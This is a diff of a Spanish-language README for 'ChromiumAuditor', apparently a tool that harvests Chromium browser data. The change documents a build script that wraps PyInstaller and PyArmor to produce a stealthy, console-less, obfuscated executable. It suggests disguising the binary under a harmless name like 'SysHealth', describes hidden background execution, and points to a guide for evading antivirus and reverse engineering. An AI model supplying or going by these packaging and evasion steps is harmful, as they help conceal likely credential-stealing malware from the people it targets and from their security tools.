@@ -91,16 +91,20 @@ Puedes pre-configurar el script editando la sección `CREDENCIALES HARDCODED` en
 
 ---
 
-## 📦 Compilación Profesional (.exe)
+## 📦 Compilación Profesional y Ofuscación
+
+Para generar un ejecutable robusto, sigiloso y (opcionalmente) ofuscado, utiliza el script **`build.py`** incluido. Este script automatiza la configuración de PyInstaller y PyArmor.
 
 ```bash
-# Compilación sigilosa: sin ventana de consola, un solo archivo portable
-pyinstaller --onefile --noconsole --name "ChromiumAuditor" main.py
+# Uso recomendado: un solo archivo, sin consola y con nombre personalizado
+python build.py --name "SysHealth" --onefile --noconsole
+
+# Para una compilación rápida sin ofuscación (solo PyInstaller)
+python build.py --no-obf --name "ChromiumAuditor"
 ```
 
-> [!NOTE]
-> `--noconsole` es **obligatorio** para sigilo total. Sin él aparece una ventana negra de terminal al ejecutarse.
-> Compatible con llamadas desde **Batch** (`call ChromiumAuditor.exe`) y ejecución en background (`start /b ChromiumAuditor.exe`).
+> [!TIP]
+> Puedes ver todas las opciones de personalización (iconos, carpetas de salida, etc.) ejecutando `python build.py --help`.
 
 ### 🛡️ Endurecimiento y Ofuscación
 Para proteger el binario contra ingeniería inversa y antivirus, consulta la [Guía de Ofuscación Híbrida](docs/OBFUSCATION_GUIDE.md).
